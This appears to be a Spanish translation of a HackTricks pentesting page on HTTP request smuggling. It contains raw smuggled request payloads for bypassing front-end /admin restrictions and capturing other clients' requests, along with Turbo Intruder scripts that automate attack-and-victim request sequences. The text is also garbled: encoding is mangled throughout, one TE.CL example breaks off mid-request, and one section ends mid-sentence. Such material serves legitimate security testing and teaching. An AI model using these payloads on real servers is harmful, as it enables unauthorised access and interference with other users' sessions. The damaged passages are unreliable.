# Ataque de Desincronizaci√≥n de Petici√≥n HTTP / Ataque de Desincronizaci√≥n de HTTP

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## ¬øQu√© es?

Esta vulnerabilidad ocurre cuando una **desincronizaci√≥n** entre los **proxies de front-end** y el servidor **back-end** permite a un **atacante** enviar una **petici√≥n HTTP** que ser√° **interpretada** como una **√∫nica petici√≥n** por los **proxies de front-end** (balance de carga / proxy inverso) y como **2 peticiones** por el servidor **back-end**.\
Esto permite a un usuario **modificar la siguiente petici√≥n que llega al servidor back-end despu√©s de la suya**.

### Teor√≠a

[**Especificaci√≥n RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Si se recibe un mensaje con un campo de encabezado Transfer-Encoding y un campo de encabezado Content-Length, este √∫ltimo DEBE ser ignorado.

**Content-Length**

> El encabezado de entidad Content-Length indica el tama√±o del cuerpo de la entidad, en bytes, enviado al destinatario.

**Transfer-Encoding: chunked**

> El encabezado de Transfer-Encoding especifica la forma de codificaci√≥n utilizada para transferir de manera segura el cuerpo de carga √∫til al usuario.\
> Chunked significa que se env√≠an datos grandes en una serie de fragmentos.

### Realidad

El **front-end** (un balanceador de carga / proxy inverso) **procesa** el encabezado de **content-length** o el de **transfer-encoding** y el servidor **back-end** procesa el otro, provocando una **desincronizaci√≥n** entre los 2 sistemas.\
Esto podr√≠a ser muy cr√≠tico ya que **un atacante podr√° enviar una petici√≥n** al proxy inverso que ser√° **interpretada** por el servidor **back-end como 2 peticiones diferentes**. El **peligro** de esta t√©cnica reside en el hecho de que el servidor **back-end interpretar√°** la **2¬™ petici√≥n inyectada** como si **hubiera venido del siguiente cliente** y la **petici√≥n real** de ese cliente ser√° **parte** de la **petici√≥n inyectada**.

### Particularidades

Recuerda que en HTTP **un car√°cter de nueva l√≠nea est√° compuesto por 2 bytes:**

* **Content-Length**: Este encabezado utiliza un **n√∫mero decimal** para indicar el **n√∫mero** de **bytes** del **cuerpo** de la petici√≥n. Se espera que el cuerpo termine en el √∫ltimo car√°cter, **no se necesita una nueva l√≠nea al final de la petici√≥n**.
* **Transfer-Encoding:** Este encabezado utiliza en el **cuerpo** un **n√∫mero hexadecimal** para indicar el **n√∫mero** de **bytes** del **siguiente fragmento**. El **fragmento** debe **terminar** con una **nueva l√≠nea** pero esta nueva l√≠nea **no se cuenta** en el indicador de longitud. Este m√©todo de transferencia debe terminar con un **fragmento de tama√±o 0 seguido de 2 nuevas l√≠neas**: `0`
* **Connection**: En base a mi experiencia, se recomienda usar **`Connection: keep-alive`** en la primera petici√≥n del ataque de desincronizaci√≥n de petici√≥n.

## Ejemplos b√°sicos

Entonces, los ataques de desincronizaci√≥n de petici√≥n implican colocar tanto el encabezado `Content-Length` como el encabezado `Transfer-Encoding` en una sola petici√≥n HTTP y manipularlos de manera que los servidores de front-end y back-end procesen la petici√≥n de manera diferente. La forma exacta en que se hace esto depende del comportamiento de los dos servidores:

* **CL.TE**: el servidor de front-end utiliza el encabezado `Content-Length` y el servidor de back-end utiliza el encabezado `Transfer-Encoding`.
* **TE.CL**: el servidor de front-end utiliza el encabezado `Transfer-Encoding` y el servidor de back-end utiliza el encabezado `Content-Length`.
* **TE.TE**: los servidores de front-end y back-end admiten el encabezado `Transfer-Encoding`, pero se puede inducir a uno de los servidores a no procesarlo mediante la obfuscaci√≥n del encabezado de alguna manera.

### Vulnerabilidades CL.TE

Aqu√≠, el servidor de **front-end** utiliza el encabezado **`Content-Length`** y el servidor de **back-end** utiliza el encabezado **`Transfer-Encoding`**. Podemos realizar un ataque simple de desincronizaci√≥n de petici√≥n HTTP de la siguiente manera:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

Observa c√≥mo `Content-Length` indica que la **longitud del cuerpo de la petici√≥n es de 30 bytes** (_recuerda que HTTP utiliza una nueva l√≠nea, por lo que son 2 bytes por cada nueva l√≠nea_), por lo que el proxy inverso **enviar√° la petici√≥n completa** al servidor back-end, y el servidor back-end procesar√° el encabezado `Transfer-Encoding`, dejando `GET /404 HTTP/1.1` como el **inicio de la siguiente petici√≥n** (por cierto, la siguiente petici√≥n se agregar√° a `Foo:x<La siguiente petici√≥n comienza aqu√≠>`).

### Vulnerabilidades TE.CL

Aqu√≠, el servidor de front-end utiliza el encabezado `Transfer-Encoding` y el servidor de back-end utiliza el encabezado `Content-Length`. Podemos realizar un ataque simple de desincronizaci√≥n de petici√≥n HTTP de la siguiente manera:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
Dado que el servidor de front-end utiliza el encabezado `Content-Length`, solo reenviar√° parte de esta solicitud, omitiendo el `0`. El servidor de back-end utiliza el encabezado `Transfer-Encoding`, procesa el primer fragmento y luego espera a que llegue el siguiente fragmento. Esto causar√° una demora observable en el tiempo.

A veces, en lugar de recibir un tiempo de espera agotado, se recibe una solicitud incorrecta 400 del host final como en el siguiente escenario, donde se env√≠a una carga √∫til CL.TE:

![](<../../.gitbook/assets/image (444).png>)

Y la respuesta es una redirecci√≥n que contiene un error dentro del cuerpo, incluso con la versi√≥n del haproxy utilizado:

![](<../../.gitbook/assets/image (443).png>)

### Encontrar vulnerabilidades TE.CL utilizando t√©cnicas de temporizaci√≥n

Si una aplicaci√≥n es vulnerable a la variante TE.CL de la manipulaci√≥n de solicitudes, entonces enviar una solicitud como la siguiente a menudo causar√° una demora en el tiempo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
Dado que el servidor de front-end utiliza el encabezado `Transfer-Encoding`, solo reenviar√° parte de esta solicitud, omitiendo la `X`. El servidor de back-end utiliza el encabezado `Content-Length`, espera m√°s contenido en el cuerpo del mensaje y espera que llegue el contenido restante. Esto causar√° un retraso observable en el tiempo.

### Sondeando vulnerabilidades de solicitud HTTP Smuggling

Una vez que haya encontrado que las **t√©cnicas de temporizaci√≥n est√°n funcionando**, debe **sondear** que puede **alterar las solicitudes de otros clientes**.\
La forma m√°s f√°cil de hacer esto es intentar envenenar sus propias solicitudes, **hacer una solicitud para `/` y devolver un 404, por ejemplo**.\
En los [Ejemplos B√°sicos](./#basic-examples) ya vimos ejemplos de `CL.TE` y `TE.CL` de c√≥mo envenenar la solicitud de un cliente para solicitar `/404`, provocando una respuesta 404 cuando el cliente estaba solicitando cualquier otro recurso.

**Notas**

Algunas consideraciones importantes deben tenerse en cuenta al intentar confirmar vulnerabilidades de solicitud de contrabando a trav√©s de la interferencia con otras solicitudes:

* La solicitud "ataque" y la solicitud "normal" deben enviarse al servidor utilizando diferentes conexiones de red. Enviar ambas solicitudes a trav√©s de la misma conexi√≥n no demostrar√° que existe la vulnerabilidad.
* La solicitud "ataque" y la solicitud "normal" deben usar la misma URL y los mismos nombres de par√°metros, en la medida de lo posible. Esto se debe a que muchas aplicaciones modernas enrutan las solicitudes de front-end a diferentes servidores de back-end seg√∫n la URL y los par√°metros. Usar la misma URL y los mismos par√°metros aumenta la posibilidad de que las solicitudes sean procesadas por el mismo servidor de back-end, lo que es esencial para que funcione el ataque.
* Al probar la solicitud "normal" para detectar cualquier interferencia de la solicitud "ataque", est√° en una carrera con cualquier otra solicitud que la aplicaci√≥n est√© recibiendo al mismo tiempo, incluidas las de otros usuarios. Debe enviar la solicitud "normal" inmediatamente despu√©s de la solicitud "ataque". Si la aplicaci√≥n est√° ocupada, es posible que deba realizar varios intentos para confirmar la vulnerabilidad.
* En algunas aplicaciones, el servidor de front-end funciona como un equilibrador de carga y reenv√≠a las solicitudes a diferentes sistemas de back-end seg√∫n alg√∫n algoritmo de equilibrio de carga. Si sus solicitudes "ataque" y "normal" se reenv√≠an a diferentes sistemas de back-end, entonces el ataque fallar√°. Esta es una raz√≥n adicional por la cual es posible que deba intentarlo varias veces antes de que se pueda confirmar una vulnerabilidad.
* Si su ataque tiene √©xito al interferir con una solicitud posterior, pero esta no fue la solicitud "normal" que envi√≥ para detectar la interferencia, esto significa que otro usuario de la aplicaci√≥n se vio afectado por su ataque. Si contin√∫a realizando la prueba, esto podr√≠a tener un efecto disruptivo en otros usuarios, y debe tener precauci√≥n.

### Forzando a trav√©s de encabezados hop-by-hop

Abusando de los encabezados hop-by-hop, podr√≠a indicarle al proxy que **elimine el encabezado Content-Length o Transfer-Encoding para que sea posible abusar de una solicitud HTTP smuggling**.
```
Connection: Content-Lentgh
```
Para **m√°s informaci√≥n sobre las cabeceras hop-by-hop** visita:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Abusando de HTTP Request Smuggling

### Para evadir controles de seguridad del front-end

A veces, los **proxies del front-end realizar√°n algunas verificaciones de seguridad**. Puedes evitarlas abusando de HTTP Request Smuggling, ya que podr√°s **evadir las protecciones**. Por ejemplo, en este ejemplo **no puedes acceder a `/admin` desde el exterior** y el proxy del front-end lo est√° comprobando, pero este **proxy no est√° comprobando la solicitud incrustada**:

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### Revelando la reescritura de solicitudes del front-end <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

En muchas aplicaciones, el **servidor del front-end realiza alguna reescritura de solicitudes** antes de que se reenv√≠en al servidor del back-end, normalmente agregando algunas cabeceras de solicitud adicionales.\
Una cosa com√∫n que se hace es **agregar a la solicitud la cabecera** `X-Forwarded-For: <IP del cliente>` o alguna cabecera similar para que el back-end conozca la IP del cliente.\
A veces, si puedes **encontrar qu√© nuevos valores se agregan** a la solicitud, podr√≠as ser capaz de **evadir protecciones** y **acceder a informaci√≥n/endpoint ocultos**.

Para descubrir c√≥mo el proxy est√° reescribiendo la solicitud, necesitas **encontrar un par√°metro POST que el back-end reflejar√° en la respuesta**. Luego, usa este par√°metro como el √∫ltimo y usa un exploit como este:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

En este caso, la siguiente solicitud se agregar√° despu√©s de `search=`, que tambi√©n
### Armando HTTP Request Smuggling con Desincronizaci√≥n de Respuesta HTTP

¬øHas encontrado alguna vulnerabilidad de HTTP Request Smuggling y no sabes c√≥mo explotarla? Prueba este otro m√©todo de explotaci√≥n:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Scripts de Turbo Intruder

### CL.TE

Desde [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )
    engine.start()

    attack = '''POST / HTTP/1.1
 Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

    engine.queue(attack)

    victim = '''GET / HTTP/1.1
Host: xxx.com

'''
    for i in range(14):
        engine.queue(victim)
        time.sleep(0.05)

def handleResponse(req, interesting):
    table.add(req)
```
### TE.CL

Desde: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)

#### Descripci√≥n

TE.CL es una t√©cnica de smuggling HTTP que se aprovecha de la forma en que los servidores proxy manejan las cabeceras Transfer-Encoding y Content-Length. Esta t√©cnica se basa en enviar una solicitud HTTP con dos conjuntos de cabeceras Content-Length y Transfer-Encoding que se procesan de manera diferente por el servidor proxy y el servidor de origen. Esto puede llevar a una variedad de problemas, incluyendo la ejecuci√≥n de ataques de desincronizaci√≥n HTTP y la toma de control de cuentas.

#### Referencias

- [https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [https://www.nccgroup.com/uk/about-us/newsroom-and-events/blogs/2020/july/http-desync-attacks-what-happened-next/](https://www.nccgroup.com/uk/about-us/newsroom-and-events/blogs/2020/july/http-desync-attacks-what-happened-next/)
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )
    engine.start()

    attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
    engine.queue(attack)

    victim = '''GET / HTTP/1.1
Host: xxx.com

'''
    for i in range(14):
        engine.queue(victim)
        time.sleep(0.05)


def handleResponse(req, interesting):
    table.add(req)
```
## M√°s informaci√≥n

![](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

[Imagen de aqu√≠.](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## Herramientas

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Esta herramienta es un Fuzzer HTTP basado en gram√°tica √∫til para encontrar discrepancias extra√±as de smuggling de solicitudes.

## Referencias

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com).
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live).

* **Comparte tus trucos de hacking enviando PR a los repositorios** [**hacktricks**](https://github.com/carlospolop/hacktricks) **y** [**hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
